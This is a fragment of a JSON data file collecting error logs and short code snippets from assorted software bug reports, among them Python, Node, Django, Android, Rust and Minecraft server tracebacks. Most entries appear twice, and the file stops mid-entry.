        "logs": "`Copying: asa992-32-lfbff-k8.SPA to: MUCAZ-ASA5516-01: 100%|##########| 112M/112M [48:15<00:00, 48.8kb/s]   \r\nTraceback (most recent call last):\r\n  File \"asa.py\", line 332, in <module>\r\n    device.upgrade()\r\n  File \"asa.py\", line 310, in upgrade\r\n    self.copy_with_progress()\r\n  File \"asa.py\", line 242, in copy_with_progress\r\n    self.ft.scp_client.put(source, dest)\r\n  File \"/Library/Python/2.7/site-packages/scp.py\", line 154, in put\r\n    self._send_files(files)\r\n  File \"/Library/Python/2.7/site-packages/scp.py\", line 250, in _send_files\r\n    self._send_file(fl, name, mode, size)\r\n  File \"/Library/Python/2.7/site-packages/scp.py\", line 276, in _send_file\r\n    self._recv_confirm()\r\n  File \"/Library/Python/2.7/site-packages/scp.py\", line 349, in _recv_confirm\r\n    raise SCPException('Invalid response from server', msg)\r\nscp.SCPException: ('Invalid response from server', 'Computed Hash   SHA2: d9b83d16cd493a213def1ec238f8e699\\r\\n                      c908a0b4383e86fd09228635fe545f5a\\r\\n                      76f8098392a0618e54e5724aa09ceb97\\r\\n                      da5d46679d75784d7e785e5659e73d64\\r\\n                      \\r\\nEmbedded Hash   SHA2: d9b83d16cd493a213def1ec238f8e699\\r\\n                      c908a0b4383e86fd09228635fe545f5a\\r\\n                      76f8098392a0618e54e5724aa09ceb97\\r\\n                      da5d46679d75784d7e785e5659e73d64\\r\\n                      \\r\\n\\r\\nDigital signat')"
    },
    {
        "logs": "`\r\n    def _recv_confirm(self):\r\n        # read scp response\r\n        msg = b''\r\n        try:\r\n            msg = self.channel.recv(512)\r\n        except SocketTimeout:\r\n            raise SCPException('Timeout waiting for scp response')\r\n        # slice off the first byte, so this compare will work in py2 and py3\r\n        if msg and msg[0:1] == b'\\x00':\r\n            return\r\n        elif msg and msg[0:1] == b'\\x01':\r\n            raise SCPException(asunicode(msg[1:]))\r\n        elif self.channel.recv_stderr_ready():\r\n            msg = self.channel.recv_stderr(512)\r\n            raise SCPException(asunicode(msg))\r\n        elif not msg:\r\n            raise SCPException('No response from server')\r\n        else:\r\n            raise SCPException('Invalid response from server', msg)\r\n"
    },
    {
        "logs": "`\r\n    sub = rospy.Subscriber('/camera/infra1/image_rect_raw', msg_Image, image_callback, queue_size=1)\r\n\r\n    def image_callback(self, image_msg):\r\n        system_time = time.time()\r\n        try:\r\n            image = self.bridge.imgmsg_to_cv2(image_msg, desired_encoding=\"passthrough\")\r\n        except CvBridgeError as e:\r\n            print(e)\r\n        print image.shape\r\n"
    },
    {
        "logs": "```\r\n    sub = rospy.Subscriber('/camera/infra1/image_rect_raw', msg_Image, image_callback, queue_size=1)\r\n\r\n    def image_callback(self, image_msg):\r\n        system_time = time.time()\r\n        try:\r\n            image = self.bridge.imgmsg_to_cv2(image_msg, desired_encoding=\"passthrough\")\r\n        except CvBridgeError as e:\r\n            print(e)\r\n        print image.shape\r\n"
    },
    {
        "logs": "`\r\n[11/18/2020, 11:56:23] [Nursery] Error: Unsupported state or unable to authenticate data\r\n    at Decipheriv.final (internal/crypto/cipher.js:172:29)\r\n    at Parser.decryptPayload (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/lib/parser.js:191:14)\r\n    at Parser.parse (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/lib/parser.js:59:12)\r\n    at Scanner.parseServiceData (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/lib/scanner.js:171:52)\r\n    at Scanner.onDiscover (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/lib/scanner.js:92:25)\r\n    at Noble.emit (events.js:322:22)\r\n    at Noble.onDiscover (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/noble.js:196:10)\r\n    at NobleBindings.emit (events.js:310:20)\r\n    at NobleBindings.onDiscover (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/bindings.js:169:10)\r\n    at Gap.emit (events.js:310:20)\r\n    at Gap.onHciLeAdvertisingReport (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/gap.js:244:10)\r\n    at Hci.emit (events.js:310:20)\r\n    at Hci.processLeAdvertisingReport (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/hci.js:656:12)\r\n    at Hci.processLeMetaEvent (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/hci.js:612:10)\r\n    at Hci.onSocketData (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/hci.js:483:12)\r\n    at BluetoothHciSocket.emit (events.js:310:20)\r\n"
    },
    {
        "logs": "```\r\n[11/18/2020, 11:56:23] [Nursery] Error: Unsupported state or unable to authenticate data\r\n    at Decipheriv.final (internal/crypto/cipher.js:172:29)\r\n    at Parser.decryptPayload (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/lib/parser.js:191:14)\r\n    at Parser.parse (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/lib/parser.js:59:12)\r\n    at Scanner.parseServiceData (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/lib/scanner.js:171:52)\r\n    at Scanner.onDiscover (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/lib/scanner.js:92:25)\r\n    at Noble.emit (events.js:322:22)\r\n    at Noble.onDiscover (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/noble.js:196:10)\r\n    at NobleBindings.emit (events.js:310:20)\r\n    at NobleBindings.onDiscover (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/bindings.js:169:10)\r\n    at Gap.emit (events.js:310:20)\r\n    at Gap.onHciLeAdvertisingReport (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/gap.js:244:10)\r\n    at Hci.emit (events.js:310:20)\r\n    at Hci.processLeAdvertisingReport (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/hci.js:656:12)\r\n    at Hci.processLeMetaEvent (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/hci.js:612:10)\r\n    at Hci.onSocketData (/usr/local/lib/node_modules/homebridge-mi-hygrothermograph/node_modules/@abandonware/noble/lib/hci-socket/hci.js:483:12)\r\n    at BluetoothHciSocket.emit (events.js:310:20)\r\n"
    },
    {
        "logs": "`\r\nI verified that there is data in the feed. I do also get data from it when switching both lines. They just don't run in this order.\r\nCan someone else verify this?\r\n\r\nBy this time I forge my request URL myself and call it via a request object. I would, however, more likely use the matrixportal built-in functions.\r\n\r\nThanks and best regards\n<issue_comment>username_1: Please double check you are using the latest versions of ESP32SPI and Requests libraries (and let us know what versions). We fixed a number of issues in them.\n<issue_comment>username_0: Just downloaded and installed latest libraries 20201120. Still the same error.\n<issue_comment>username_2: @username_0 I just tried out https://learn.adafruit.com/aio-quote-board-matrix-display using the latest libraries from the bundle. This project uses "
    },
    {
        "logs": "` and it is working for me. Keep in mind that Adafruit IO deletes older data after a certain period of time. If you can see the data, then it should be ok.\n<issue_comment>username_2: Never mind, I see that it works if you don't call"
    },
    {
        "logs": "`, but fails if you do. I'll take a closer look.\n<issue_comment>username_2: After commenting out the embedded error handlers, here's the real traceback:\r\n"
    },
    {
        "logs": "`\r\nIncorrect image size! 374 vs. 5992721\r\nav_interleaved_write_frame(): Broken pipe\r\nframe=    1 fps=0.0 q=0.0 Lsize=    5852kB time=00:00:00.04 bitrate=1198544.2kbits/s\r\nvideo:5852kB audio:0kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: 0.000000%\r\nConversion failed!\r\n"
    },
    {
        "logs": "```\r\nIncorrect image size! 374 vs. 5992721\r\nav_interleaved_write_frame(): Broken pipe\r\nframe=    1 fps=0.0 q=0.0 Lsize=    5852kB time=00:00:00.04 bitrate=1198544.2kbits/s\r\nvideo:5852kB audio:0kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: 0.000000%\r\nConversion failed!\r\n"
    },
    {
        "logs": "`javascript\r\nif ( window.addEventListener ) {\r\n\twindow.addEventListener('error', function(e) {\r\n\t\tif ( e.lineno != 0 ) {\r\n\t\t\tdarkSoulsErrorHandler();\r\n\t\t}\r\n\t});\r\n} else {\r\n\twindow.attachEvent('onerror', function(e) {\r\n\t\tif ( e.lineno != 0 ) {\r\n\t\t\tdarkSoulsErrorHandler();\r\n\t\t}\r\n\t});\r\n}\r\n\r\nfunction darkSoulsErrorHandler(){\r\n\t//Do something dastardly here.\r\n\talert(\"You Died\");\r\n}\r\n"
    },
    {
        "logs": "```javascript\r\nif ( window.addEventListener ) {\r\n\twindow.addEventListener('error', function(e) {\r\n\t\tif ( e.lineno != 0 ) {\r\n\t\t\tdarkSoulsErrorHandler();\r\n\t\t}\r\n\t});\r\n} else {\r\n\twindow.attachEvent('onerror', function(e) {\r\n\t\tif ( e.lineno != 0 ) {\r\n\t\t\tdarkSoulsErrorHandler();\r\n\t\t}\r\n\t});\r\n}\r\n\r\nfunction darkSoulsErrorHandler(){\r\n\t//Do something dastardly here.\r\n\talert(\"You Died\");\r\n}\r\n"
    },
    {
        "logs": "`\r\n\r\nTraceback:\r\nFile \"/PATH/src/django/django/core/handlers/base.py\" in get_response\r\n  163.                 response = response.render()\r\nFile \"/PATH/src/django/django/template/response.py\" in render\r\n  156.             self.content = self.rendered_content\r\nFile \"/PATH/src/django/django/template/response.py\" in rendered_content\r\n  133.         content = template.render(context, self._request)\r\nFile \"/PATH/src/django/django/template/backends/django.py\" in render\r\n  83.         return self.template.render(context)\r\nFile \"/PATH/src/django/django/template/base.py\" in render\r\n  211.             return self._render(context)\r\nFile \"/PATH/src/django/django/template/base.py\" in _render\r\n  199.         return self.nodelist.render(context)\r\nFile \"/PATH/src/django/django/template/base.py\" in render\r\n  905.                 bit = self.render_node(node, context)\r\nFile \"/PATH/src/django/django/template/debug.py\" in render_node\r\n  80.             return node.render(context)\r\nFile \"/PATH/src/django/django/template/loader_tags.py\" in render\r\n  151.                 return template.render(context.new(values))\r\nFile \"/PATH/src/django/django/template/base.py\" in render\r\n  211.             return self._render(context)\r\nFile \"/PATH/src/django/django/template/base.py\" in _render\r\n  199.         return self.nodelist.render(context)\r\nFile \"/PATH/src/django/django/template/base.py\" in render\r\n  905.                 bit = self.render_node(node, context)\r\nFile \"/PATH/src/django/django/template/debug.py\" in render_node\r\n  80.             return node.render(context)\r\nFile \"/PATH/lib/python3.4/site-packages/formulation/templatetags/formulation.py\" in render\r\n  109.             'formulation': resolve_blocks(tmpl_name, safe_context),\r\nFile \"/PATH/lib/python3.4/site-packages/formulation/templatetags/formulation.py\" in resolve_blocks\r\n  34.         for block in template.nodelist.get_nodes_by_type(BlockNode)\r\n\r\nException Type: AttributeError at /\r\nException Value: 'Template' object has no attribute 'nodelist'\r\n"
    },
    {
        "logs": "`\r\n\r\nHeute, 13:04 in der App-Version 6\r\nLGE L90 (w7ds), 1024MB RAM, Android 5.0\r\nBericht 1 von 4\r\njava.lang.RuntimeException: \r\n \r\n  at android.app.ActivityThread.performLaunchActivity (ActivityThread.java:2331)\r\n \r\n  at android.app.ActivityThread.handleLaunchActivity (ActivityThread.java:2391)\r\n \r\n  at android.app.ActivityThread.access$800 (ActivityThread.java:151)\r\n \r\n  at android.app.ActivityThread$H.handleMessage (ActivityThread.java:1309)\r\n \r\n  at android.os.Handler.dispatchMessage (Handler.java:102)\r\n \r\n  at android.os.Looper.loop (Looper.java:135)\r\n \r\n  at android.app.ActivityThread.main (ActivityThread.java:5349)\r\n \r\n  at java.lang.reflect.Method.invoke (Native Method)\r\n \r\n  at java.lang.reflect.Method.invoke (Method.java:372)\r\n \r\n  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run (ZygoteInit.java:908)\r\n \r\n  at com.android.internal.os.ZygoteInit.main (ZygoteInit.java:703)\r\nCaused by: java.lang.IllegalArgumentException: \r\n \r\n  at java.io.File.checkURI (File.java:220)\r\n \r\n  at java.io.File.<init> (File.java:177)\r\n \r\n  at net.username_0.markor.model.MarkorSingleton.getFileFromUri (MarkorSingleton.java:158)\r\n \r\n  at net.username_0.markor.activity.NoteActivity.readFileUriFromIntent (NoteActivity.java:168)\r\n \r\n  at net.username_0.markor.activity.NoteActivity.openFromEditAction (NoteActivity.java:152)\r\n \r\n  at net.username_0.markor.activity.NoteActivity.onCreate (NoteActivity.java:113)\r\n \r\n  at android.app.Activity.performCreate (Activity.java:6020)\r\n \r\n  at android.app.Instrumentation.callActivityOnCreate (Instrumentation.java:1105)\r\n \r\n  at android.app.ActivityThread.performLaunchActivity (ActivityThread.java:2284)\r\n"
    },
    {
        "logs": "```\r\n\r\nHeute, 13:04 in der App-Version 6\r\nLGE L90 (w7ds), 1024MB RAM, Android 5.0\r\nBericht 1 von 4\r\njava.lang.RuntimeException: \r\n \r\n  at android.app.ActivityThread.performLaunchActivity (ActivityThread.java:2331)\r\n \r\n  at android.app.ActivityThread.handleLaunchActivity (ActivityThread.java:2391)\r\n \r\n  at android.app.ActivityThread.access$800 (ActivityThread.java:151)\r\n \r\n  at android.app.ActivityThread$H.handleMessage (ActivityThread.java:1309)\r\n \r\n  at android.os.Handler.dispatchMessage (Handler.java:102)\r\n \r\n  at android.os.Looper.loop (Looper.java:135)\r\n \r\n  at android.app.ActivityThread.main (ActivityThread.java:5349)\r\n \r\n  at java.lang.reflect.Method.invoke (Native Method)\r\n \r\n  at java.lang.reflect.Method.invoke (Method.java:372)\r\n \r\n  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run (ZygoteInit.java:908)\r\n \r\n  at com.android.internal.os.ZygoteInit.main (ZygoteInit.java:703)\r\nCaused by: java.lang.IllegalArgumentException: \r\n \r\n  at java.io.File.checkURI (File.java:220)\r\n \r\n  at java.io.File.<init> (File.java:177)\r\n \r\n  at net.username_0.markor.model.MarkorSingleton.getFileFromUri (MarkorSingleton.java:158)\r\n \r\n  at net.username_0.markor.activity.NoteActivity.readFileUriFromIntent (NoteActivity.java:168)\r\n \r\n  at net.username_0.markor.activity.NoteActivity.openFromEditAction (NoteActivity.java:152)\r\n \r\n  at net.username_0.markor.activity.NoteActivity.onCreate (NoteActivity.java:113)\r\n \r\n  at android.app.Activity.performCreate (Activity.java:6020)\r\n \r\n  at android.app.Instrumentation.callActivityOnCreate (Instrumentation.java:1105)\r\n \r\n  at android.app.ActivityThread.performLaunchActivity (ActivityThread.java:2284)\r\n"
    },
    {
        "logs": "` value: Error(PrimaryScreenInfoError(147), State { next_error: None, backtrace: None })', /checkout/src/libcore/result.rs:906:4\r\nnote: Run with "
    },
    {
        "logs": "```thread 'main' panicked at 'called `Result::unwrap()` on an `Err` value: Error(PrimaryScreenInfoError(147), State { next_error: None, backtrace: None })', /checkout/src/libcore/result.rs:906:4\r\nnote: Run with `RUST_BACKTRACE=1` for a backtrace."
    },
    {
        "logs": "`\r\n--------------------------------------------------------------------------------\r\nERROR: coercing to Unicode: need string or buffer, list found\r\n--------------------------------------------------------------------------------\r\n\r\n********************************************************************************\r\n2017-Oct-16 09:01pm\r\nExecuting: \"make -j4 2>&1 | tee -a /Users/name/Downloads/armory_0.96.3-src/osxbuild/build-app.log.txt\"\r\nExecuting from: \"[]\"\r\n\r\n--------------------------------------------------------------------------------\r\nERROR: coercing to Unicode: need string or buffer, list found\r\n--------------------------------------------------------------------------------\r\n\r\nTraceback (most recent call last):\r\n  File \"build-app.py\", line 741, in <module>\r\n    main()\r\n  File \"build-app.py\", line 135, in main\r\n    compile_libpng()\r\n  File \"build-app.py\", line 466, in compile_libpng\r\n    src = path.join(pngDir, '.libs', dylib)\r\n  File \"/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/posixpath.py\", line 70, in join\r\n    elif path == '' or path.endswith('/'):\r\nAttributeError: 'list' object has no attribute 'endswith'\r\n"
    },
    {
        "logs": "`\r\n OkHttpClient.Builder builder = new OkHttpClient().newBuilder()\r\n                .connectTimeout(120, TimeUnit.SECONDS)\r\n                .writeTimeout(120, TimeUnit.SECONDS)\r\n                .readTimeout(120, TimeUnit.SECONDS)\r\n                .cache(cache)\r\n                .retryOnConnectionFailure(true)\r\n                .addInterceptor(new com.snakydesign.watchtower.interceptor.WatchTowerInterceptor());\r\n"
    },
    {
        "logs": "```\r\n OkHttpClient.Builder builder = new OkHttpClient().newBuilder()\r\n                .connectTimeout(120, TimeUnit.SECONDS)\r\n                .writeTimeout(120, TimeUnit.SECONDS)\r\n                .readTimeout(120, TimeUnit.SECONDS)\r\n                .cache(cache)\r\n                .retryOnConnectionFailure(true)\r\n                .addInterceptor(new com.snakydesign.watchtower.interceptor.WatchTowerInterceptor());\r\n"
    },
    {
        "logs": "`\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*****************************************************************************************************************************************/\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                              Exception while trying to apply transaction                                              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*****************************************************************************************************************************************/\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* BlockTransactions failing to process can lead to unintended                                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* consequences. If the exception is *directly* coming from                                                                              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* Sponge's code, please report to Sponge.                                                                                               */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  BlockStates                                                                                                                          */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  MarkedRemoved                                                                                                                        */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  Affected Tiles                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  QueuedTiles                                                                                                                          */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  QueuedRemovals                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* NeighborNotification                                                                                                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  Source Pos : soulshardsrespawn:soul_cage[active=false,powered=true], BlockPos{x=-10435, y=51, z=-1245}                               */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  Notification : forgemultipartcbe:multipart_block, BlockPos{x=-10435, y=51, z=-1246}                                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* Exception:                                                                                                                            */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* net.minecraft.util.ReportedException: Exception while updating neighbours                                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseTracker.notifyBlockOfStateChange(PhaseTracker.java:727)                              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.context.BlockTransaction$NeighborNotification.process(BlockTransaction.java:578)          */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.context.MultiBlockCaptureSupplier.processTransactions(MultiBlockCaptureSupplier.java:727) */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.processBlockCaptures(TrackingUtil.java:437)                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.processBlockCaptures(TrackingUtil.java:411)                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.phase.tick.TileEntityTickPhaseState.unwind(TileEntityTickPhaseState.java:123)             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.phase.tick.TileEntityTickPhaseState.unwind(TileEntityTickPhaseState.java:71)              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseTracker.completePhase(PhaseTracker.java:318)                                         */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseContext.close(PhaseContext.java:613)                                                 */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.tickTileEntity(TrackingUtil.java:259)                                        */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.updateTileEntity(WorldServer.java:3167)                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.redirect$onUpdateTileEntities$zme000(WorldServer.java:3151)                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.World.func_72939_s(World.java:6842)                                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.func_72939_s(WorldServer.java:2290)                                                               */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.func_71190_q(MinecraftServer.java:767)                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.dedicated.DedicatedServer.func_71190_q(DedicatedServer.java:397)                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java:668)                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.run(MinecraftServer.java:526)                                                                */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     java.lang.Thread.run(Thread.java:748)                                                                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* java.lang.NullPointerException: null                                                                                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseTracker.notifyBlockOfStateChange(PhaseTracker.java:691)                              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.context.BlockTransaction$NeighborNotification.process(BlockTransaction.java:578)          */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.context.MultiBlockCaptureSupplier.processTransactions(MultiBlockCaptureSupplier.java:727) */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.processBlockCaptures(TrackingUtil.java:437)                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.processBlockCaptures(TrackingUtil.java:411)                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.phase.tick.TileEntityTickPhaseState.unwind(TileEntityTickPhaseState.java:123)             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.phase.tick.TileEntityTickPhaseState.unwind(TileEntityTickPhaseState.java:71)              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseTracker.completePhase(PhaseTracker.java:318)                                         */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseContext.close(PhaseContext.java:613)                                                 */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.tickTileEntity(TrackingUtil.java:259)                                        */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.updateTileEntity(WorldServer.java:3167)                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.redirect$onUpdateTileEntities$zme000(WorldServer.java:3151)                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.World.func_72939_s(World.java:6842)                                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.func_72939_s(WorldServer.java:2290)                                                               */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.func_71190_q(MinecraftServer.java:767)                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.dedicated.DedicatedServer.func_71190_q(DedicatedServer.java:397)                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java:668)                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.run(MinecraftServer.java:526)                                                                */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     java.lang.Thread.run(Thread.java:748)                                                                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*****************************************************************************************************************************************/\r\n"
    },
    {
        "logs": "```\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*****************************************************************************************************************************************/\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                              Exception while trying to apply transaction                                              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*****************************************************************************************************************************************/\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* BlockTransactions failing to process can lead to unintended                                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* consequences. If the exception is *directly* coming from                                                                              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* Sponge's code, please report to Sponge.                                                                                               */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  BlockStates                                                                                                                          */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  MarkedRemoved                                                                                                                        */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  Affected Tiles                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  QueuedTiles                                                                                                                          */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  QueuedRemovals                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* NeighborNotification                                                                                                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  Source Pos : soulshardsrespawn:soul_cage[active=false,powered=true], BlockPos{x=-10435, y=51, z=-1245}                               */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*  Notification : forgemultipartcbe:multipart_block, BlockPos{x=-10435, y=51, z=-1246}                                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*                                                                                                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* Exception:                                                                                                                            */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* net.minecraft.util.ReportedException: Exception while updating neighbours                                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseTracker.notifyBlockOfStateChange(PhaseTracker.java:727)                              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.context.BlockTransaction$NeighborNotification.process(BlockTransaction.java:578)          */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     